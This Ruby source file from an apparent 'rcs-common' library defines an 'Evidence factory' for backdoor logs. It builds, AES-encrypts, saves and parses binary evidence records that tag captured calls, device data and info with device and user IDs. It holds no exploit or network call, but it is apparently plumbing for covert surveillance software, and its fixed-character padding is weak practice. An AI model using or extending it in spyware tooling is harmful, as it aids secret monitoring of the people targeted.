#
# Evidence factory (backdoor logs)
#

require 'securerandom'
require 'rcs-common/crypt'
require 'rcs-common/time'
require 'rcs-common/utf16le'

# evidence types
require 'rcs-common/evidence/common'
require 'rcs-common/evidence/call'
require 'rcs-common/evidence/device'
require 'rcs-common/evidence/info'

module RCS

class Evidence
  
  extend Crypt
  include Crypt
  
  attr_reader :size
  attr_reader :binary
  attr_reader :content
  attr_reader :name
  attr_reader :timestamp
  attr_reader :info
  attr_reader :version
  
  def self.VERSION_ID
    2008121901
  end

  def initialize(key, info = {})
    @key = key
    info.each do |k,v|
      self.instance_variable_set("@#{k}", v)
    end
    @version = Evidence.VERSION_ID
  end
  
  def extend_on_type(type)
    extend RCS.const_get "#{type.to_s.capitalize}Evidence"
  end
  
  def extend_on_typeid(id)
    extend_on_type RCS::Common::EVIDENCE_TYPES[id]
  end
  
  def generate_header
    thigh, tlow = @timestamp.to_filetime
    deviceid_utf16 = @device_id.to_utf16le_binary
    userid_utf16 = @user_id.to_utf16le_binary
    sourceid_utf16 = @source_id.to_utf16le_binary

    add_header = ''
    if respond_to? :additional_header
      add_header = additional_header
    end
    additional_size = add_header.size
    struct = [Evidence.VERSION_ID, type_id, thigh, tlow, deviceid_utf16.size, userid_utf16.size, sourceid_utf16.size, additional_size]
    header = struct.pack("I*")
    
    header += deviceid_utf16
    header += userid_utf16
    header += sourceid_utf16
    header += add_header
    
    return encrypt(header)
  end
  
  def align_to_block_len(len)
    rest = len % 16
    len += (16 - rest % 16) unless rest == 0
    len
  end
  
  def encrypt(data)
    rest = align_to_block_len(data.size) - data.size
    data += "a" * rest
    return aes_encrypt(data, @key, PAD_NOPAD)
  end
  
  def decrypt(data)
    return aes_decrypt(data, @key, PAD_NOPAD)
  end
  
  def append_data(data, len = data.size)
    [len].pack("I") + data
  end
  
  # factory to create a random evidence
  def generate(type)
    @name =  SecureRandom.hex(16)
    @timestamp = Time.now.utc
    @type = type
    
    # extend class on requested type
    extend_on_type @type
    
    # header
    @binary = append_data(generate_header)
    
    # content
    if respond_to? :generate_content
      chunks = generate_content
      chunks.each do | c |
        @binary += append_data( encrypt(c), c.size )
      end
    end
    
    return self
  end
  
  def size
    @binary.size
  end
  
  # save the file in the specified dir
  def dump_to_file(dir)
    # dump the file (using the @name) in the 'dir'
    File.open(dir + '/' + @name, "wb") do |f|
      f.write(@binary)
    end
  end
  
  # load an evidence from a file
  def load_from_file(file)
    # load the content of the file in @content
    # TODO: it could be even delayed at the first time @content is requested
    File.open(file, "rb") do |f|
      @binary = f.read
      @name = File.basename f
    end
    
    return self
  end
  
  def deserialize(data)
    @binary = data
    
    header_length = data.slice!(0..3).unpack("I").shift
    header = decrypt( data.slice!(0 .. header_length - 1) )
    
    # check that version is correct
    @version = header.slice!(0..3).unpack("I").shift
    return nil unless @version == Evidence.VERSION_ID
    
    # extend class depending on evidence type
    type = header.slice!(0..3).unpack("I").shift
    begin
      @type = RCS::Common::EVIDENCE_TYPES[type]
      extend_on_typeid(type)
    rescue Exception => e
      return nil
    end

    high = header.slice!(0..3).unpack("I").shift
    low = header.slice!(0..3).unpack("I").shift
    @timestamp = Time.from_filetime(high, low)
    
    deviceid_size = header.slice!(0..3).unpack("I").shift
    userid_size = header.slice!(0..3).unpack("I").shift
    sourceid_size = header.slice!(0..3).unpack("I").shift
    additional_size = header.slice!(0..3).unpack("I").shift
    
    @device_id = header.slice!(0 .. deviceid_size - 1).force_encoding('UTF-16LE') unless deviceid_size == 0
    @user_id = header.slice!(0 .. userid_size - 1).force_encoding('UTF-16LE') unless userid_size == 0
    @source_id = header.slice!(0 .. sourceid_size - 1).force_encoding('UTF-16LE') unless sourceid_size == 0
    additional_data = ''
    additional_data += header.slice!(0 .. additional_size - 1) unless additional_size == 0
    
    decode_additional_header(additional_data) if respond_to? :decode_additional_header
    
    # split content to chunks
    chunks = []
    while data.size != 0
      len = data.slice!(0..3).unpack("I").shift
      content = data.slice!( 0 .. align_to_block_len(len) - 1 )
      chunks += [decrypt(content).slice!( 0 .. len - 1 )]
    end
    
    begin
      @content = decode_content(chunks) if respond_to? :decode_content
    rescue Exception => e
      return self
    end
    
    return self
  end
  
end

end # RCS::
